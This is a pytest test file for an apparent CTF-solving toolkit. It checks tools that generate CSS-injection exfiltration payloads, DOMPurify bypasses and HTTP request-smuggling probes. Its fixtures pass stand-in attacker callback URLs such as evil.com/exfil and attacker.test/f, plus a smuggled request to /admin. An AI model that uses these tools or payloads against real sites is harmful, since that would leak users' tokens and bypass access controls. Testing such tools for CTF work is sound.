"""
Tests for CSS injection tools and HTTP smuggling tools.

Covers:
- CssInjectionPayloadGenerator: attribute_exfil, host_context, font_face_exfil,
  import_chain, sanitizer_bypass operations with custom params and defaults
- CssExfiltrationBuilder: build_page (style_tag, import injection points),
  build_recursive operation
- HttpSmugglingProbeTool: payload generation (clte, tecl), error handling,
  URL requirement for probe operations
"""

import json
import pytest
from unittest.mock import MagicMock, patch

from ctf_solver.tools.css_tools import (
    CssInjectionPayloadGenerator,
    CssExfiltrationBuilder,
)
from ctf_solver.tools.smuggling_tools import HttpSmugglingProbeTool

# ==============================================================================
# CssInjectionPayloadGenerator Tests
# ==============================================================================


class TestCssInjectionPayloadGenerator:
    """Tests for the CssInjectionPayloadGenerator class."""

    def setup_method(self):
        """Set up test fixtures."""
        self.tool = CssInjectionPayloadGenerator()

    # -- name / description --------------------------------------------------

    def test_tool_name(self):
        """Verify tool name is 'css_injection_payload_generator'."""
        assert self.tool.name == "css_injection_payload_generator"

    def test_tool_description_exists(self):
        """Verify description is a non-empty string."""
        assert isinstance(self.tool.description, str)
        assert len(self.tool.description) > 0

    # -- error handling ------------------------------------------------------

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("not valid json {{{")
        assert "Error" in result
        assert "JSON" in result

    def test_missing_operation(self):
        """Omitting 'operation' should return an error listing valid ops."""
        result = self.tool.use(json.dumps({"element": "input"}))
        assert "Error" in result
        assert "operation" in result.lower()
        assert "attribute_exfil" in result

    def test_invalid_operation(self):
        """An unknown operation should return an error listing valid ops."""
        result = self.tool.use(json.dumps({"operation": "bogus"}))
        assert "Error" in result
        assert "bogus" in result
        assert "attribute_exfil" in result

    def test_empty_input(self):
        """Empty string input should request an operation."""
        result = self.tool.use("")
        assert "Error" in result
        assert "operation" in result.lower()

    # -- attribute_exfil -----------------------------------------------------

    def test_attribute_exfil_defaults(self):
        """attribute_exfil with defaults should use input[name=token] and hex charset."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "attribute_exfil",
                }
            )
        )
        assert "Attribute Selector Exfiltration" in result
        assert "input[name=token]" in result
        assert "value" in result
        assert "background: url(" in result

    def test_attribute_exfil_custom_params(self):
        """attribute_exfil with custom element, charset, and callback_url."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "attribute_exfil",
                    "element": "input[name=csrf]",
                    "attribute": "data-token",
                    "callback_url": "https://evil.com/exfil",
                    "charset": "abc",
                    "prefix": "x",
                }
            )
        )
        assert "input[name=csrf]" in result
        assert "data-token" in result
        assert "evil.com/exfil" in result
        # With charset "abc" and prefix "x", we should see "xa", "xb", "xc"
        assert "xa" in result
        assert "xb" in result
        assert "xc" in result

    def test_attribute_exfil_has_prefix_and_substring_sections(self):
        """attribute_exfil should contain prefix, substring, and suffix sections."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "attribute_exfil",
                }
            )
        )
        assert "Prefix-based exfiltration" in result
        assert "Substring-based exfiltration" in result
        assert "Suffix-based exfiltration" in result

    def test_attribute_exfil_css_syntax(self):
        """attribute_exfil payloads should contain valid CSS selector syntax."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "attribute_exfil",
                    "charset": "ab",
                }
            )
        )
        # Should contain CSS selectors like [value^="a"]
        assert '[value^="' in result
        assert "{ background:" in result

    # -- host_context --------------------------------------------------------

    def test_host_context_defaults(self):
        """host_context with defaults should produce :host-context() payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "host_context",
                }
            )
        )
        assert ":host-context(" in result
        assert "Shadow DOM" in result

    def test_host_context_custom(self):
        """host_context with custom target_attr and callback_url."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "host_context",
                    "target_attr": "data-secret",
                    "callback_url": "https://my-server.com/leak",
                }
            )
        )
        assert "data-secret" in result
        assert "my-server.com/leak" in result

    def test_host_context_includes_notes(self):
        """host_context should include browser compatibility notes."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "host_context",
                }
            )
        )
        assert "Chrome" in result or "Firefox" in result

    # -- font_face_exfil -----------------------------------------------------

    def test_font_face_exfil_defaults(self):
        """font_face_exfil should produce @font-face rules with unicode-range."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "font_face_exfil",
                }
            )
        )
        assert "@font-face" in result
        assert "unicode-range" in result
        assert "U+" in result

    def test_font_face_exfil_custom_charset(self):
        """font_face_exfil with a small custom charset."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "font_face_exfil",
                    "charset": "XY",
                    "callback_url": "https://attacker.test/f",
                }
            )
        )
        # X is U+0058, Y is U+0059
        assert "U+0058" in result
        assert "U+0059" in result
        assert "attacker.test/f" in result

    def test_font_face_exfil_notes(self):
        """font_face_exfil should include usage notes about character detection."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "font_face_exfil",
                }
            )
        )
        assert "PRESENCE" in result or "presence" in result
        assert "CORS" in result

    # -- import_chain --------------------------------------------------------

    def test_import_chain_defaults(self):
        """import_chain should produce @import recursive exfiltration setup."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "import_chain",
                }
            )
        )
        assert "@import" in result
        assert "Flask" in result or "flask" in result
        assert "recursive" in result.lower() or "Recursive" in result

    def test_import_chain_custom(self):
        """import_chain with custom callback_url and depth."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "import_chain",
                    "callback_url": "https://my-server.com",
                    "depth": 5,
                    "element": "input[name=flag]",
                    "attribute": "value",
                }
            )
        )
        assert "my-server.com" in result
        assert "5" in result
        assert "input[name=flag]" in result

    def test_import_chain_contains_server_code(self):
        """import_chain should include server-side Python code."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "import_chain",
                }
            )
        )
        assert (
            "def css_step" in result
            or "def generate_css" in result
            or "@app.route" in result
        )

    # -- sanitizer_bypass ----------------------------------------------------

    def test_sanitizer_bypass(self):
        """sanitizer_bypass should return DOMPurify bypass payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "sanitizer_bypass",
                }
            )
        )
        assert "Sanitizer Bypass" in result
        assert "DOMPurify" in result
        assert "@keyframes" in result
        assert "shadowrootmode" in result or "Shadow DOM" in result

    def test_sanitizer_bypass_contains_css_functions(self):
        """sanitizer_bypass should include CSS functions and techniques."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "sanitizer_bypass",
                }
            )
        )
        assert ":has(" in result
        assert "custom properties" in result.lower() or "--" in result
        assert "color-mix" in result or "crash" in result.lower()


# ==============================================================================
# CssExfiltrationBuilder Tests
# ==============================================================================


class TestCssExfiltrationBuilder:
    """Tests for the CssExfiltrationBuilder class."""

    def setup_method(self):
        """Set up test fixtures."""
        self.tool = CssExfiltrationBuilder()

    # -- name / description --------------------------------------------------

    def test_tool_name(self):
        """Verify tool name is 'css_exfiltration_builder'."""
        assert self.tool.name == "css_exfiltration_builder"

    def test_tool_description_exists(self):
        """Verify description is a non-empty string."""
        assert isinstance(self.tool.description, str)
        assert len(self.tool.description) > 0

    # -- error handling ------------------------------------------------------

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("bad json!!!")
        assert "Error" in result
        assert "JSON" in result

    def test_missing_operation(self):
        """Omitting 'operation' should return an error."""
        result = self.tool.use(json.dumps({"target_selector": "input"}))
        assert "Error" in result
        assert "operation" in result.lower()

    def test_invalid_operation(self):
        """An unknown operation should return an error."""
        result = self.tool.use(json.dumps({"operation": "nonexistent"}))
        assert "Error" in result
        assert "nonexistent" in result

    # -- build_page: style_tag -----------------------------------------------

    def test_build_page_style_tag_default(self):
        """build_page with default injection_point='style_tag' returns full HTML."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_page",
                }
            )
        )
        assert "Complete Exfiltration Page" in result
        assert "<style>" in result
        assert "<!DOCTYPE html>" in result
        assert "background: url(" in result

    def test_build_page_style_tag_custom(self):
        """build_page with custom params should reflect them in the output."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_page",
                    "injection_point": "style_tag",
                    "target_selector": "input[name=flag]",
                    "target_attr": "value",
                    "callback_url": "https://evil.test/leak",
                    "charset": "01",
                    "known_prefix": "flag{",
                }
            )
        )
        assert "input[name=flag]" in result
        assert "evil.test/leak" in result
        assert "flag{0" in result  # known_prefix + "0"
        assert "flag{1" in result  # known_prefix + "1"

    # -- build_page: import --------------------------------------------------

    def test_build_page_import(self):
        """build_page with injection_point='import' should use @import."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_page",
                    "injection_point": "import",
                    "callback_url": "https://my-server.com/leak",
                }
            )
        )
        assert "@import" in result
        assert "my-server.com/leak" in result

    # -- build_page: usage instructions --------------------------------------

    def test_build_page_includes_usage(self):
        """build_page should include usage instructions."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_page",
                }
            )
        )
        assert "USAGE" in result
        assert "admin bot" in result.lower() or "Host" in result

    # -- build_recursive -----------------------------------------------------

    def test_build_recursive_returns_flask_code(self):
        """build_recursive should return a Flask server script."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_recursive",
                }
            )
        )
        assert "Recursive CSS Import" in result
        assert "Flask" in result or "flask" in result
        assert "@app.route" in result
        assert "def generate_css" in result or "def css" in result

    def test_build_recursive_custom_params(self):
        """build_recursive with custom callback_url and target."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_recursive",
                    "callback_url": "https://my-server.com",
                    "target_selector": "input#secret",
                    "target_attr": "data-val",
                    "charset": "xyz",
                }
            )
        )
        assert "my-server.com" in result
        assert "input#secret" in result
        assert "data-val" in result
        assert "xyz" in result

    def test_build_recursive_has_initial_payload(self):
        """build_recursive should include the initial @import injection payload."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "build_recursive",
                }
            )
        )
        assert "@import" in result
        assert "Step 1" in result


# ==============================================================================
# HttpSmugglingProbeTool Tests
# ==============================================================================


class TestHttpSmugglingProbeTool:
    """Tests for the HttpSmugglingProbeTool class."""

    def setup_method(self):
        """Set up test fixtures."""
        self.mock_session = MagicMock()
        self.tool = HttpSmugglingProbeTool(session=self.mock_session)

    # -- name / description --------------------------------------------------

    def test_tool_name(self):
        """Verify tool name is 'http_smuggling_probe'."""
        assert self.tool.name == "http_smuggling_probe"

    def test_tool_description_exists(self):
        """Verify description is a non-empty string."""
        assert isinstance(self.tool.description, str)
        assert len(self.tool.description) > 0

    # -- error handling ------------------------------------------------------

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("not json {{{")
        assert "Error" in result
        assert "JSON" in result

    def test_missing_operation(self):
        """Omitting 'operation' should return an error listing valid ops."""
        result = self.tool.use(json.dumps({"url": "http://target.com"}))
        assert "Error" in result
        assert "operation" in result.lower()
        assert "clte_probe" in result

    def test_invalid_operation(self):
        """An unknown operation should return an error listing valid ops."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "h3_smuggle",
                    "url": "http://target.com",
                }
            )
        )
        assert "Error" in result
        assert "h3_smuggle" in result

    def test_empty_input(self):
        """Empty string input should request an operation."""
        result = self.tool.use("")
        assert "Error" in result
        assert "operation" in result.lower()

    def test_missing_url(self):
        """Probe operations require a URL."""
        result = self.tool.use(json.dumps({"operation": "clte_probe"}))
        assert "Error" in result
        assert "url" in result.lower()

    def test_missing_url_tecl(self):
        """tecl_probe also requires a URL."""
        result = self.tool.use(json.dumps({"operation": "tecl_probe"}))
        assert "Error" in result
        assert "url" in result.lower()

    def test_missing_url_detect(self):
        """detect also requires a URL."""
        result = self.tool.use(json.dumps({"operation": "detect"}))
        assert "Error" in result
        assert "url" in result.lower()

    # -- payload operation (pure logic, no network) --------------------------

    def test_payload_clte(self):
        """payload operation with type='clte' should return a CL.TE payload."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://target.com/",
                    "type": "clte",
                }
            )
        )
        assert "CL.TE" in result or "CLTE" in result
        assert "Content-Length" in result
        assert "Transfer-Encoding" in result
        assert "chunked" in result

    def test_payload_tecl(self):
        """payload operation with type='tecl' should return a TE.CL payload."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://target.com/",
                    "type": "tecl",
                }
            )
        )
        assert "TE.CL" in result or "TECL" in result
        assert "Content-Length" in result
        assert "Transfer-Encoding" in result

    def test_payload_invalid_type(self):
        """payload with invalid type should return an error."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://target.com/",
                    "type": "tete",
                }
            )
        )
        assert "Error" in result
        assert "clte" in result or "tecl" in result

    def test_payload_missing_url(self):
        """payload operation without url should return an error."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "type": "clte",
                }
            )
        )
        assert "Error" in result
        assert "url" in result.lower()

    def test_payload_custom_smuggled_request(self):
        """payload with custom smuggled_request should include it."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://target.com/",
                    "type": "clte",
                    "smuggled_request": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
                }
            )
        )
        assert "/admin" in result

    def test_payload_includes_h2c_upgrade(self):
        """payload should include an H2C upgrade smuggling bonus section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://target.com/path",
                    "type": "clte",
                }
            )
        )
        assert "H2C" in result
        assert "Upgrade" in result

    def test_payload_uses_correct_host(self):
        """payload should extract the correct host from the URL."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "payload",
                    "url": "http://example.internal:8080/api",
                    "type": "tecl",
                }
            )
        )
        assert "example.internal" in result

    # -- TE obfuscations attribute -------------------------------------------

    def test_te_obfuscations_list(self):
        """The tool should have multiple TE obfuscation variants for TE.TE probes."""
        assert len(self.tool.TE_OBFUSCATIONS) >= 5
        for variant, description in self.tool.TE_OBFUSCATIONS:
            assert isinstance(variant, str)
            assert isinstance(description, str)
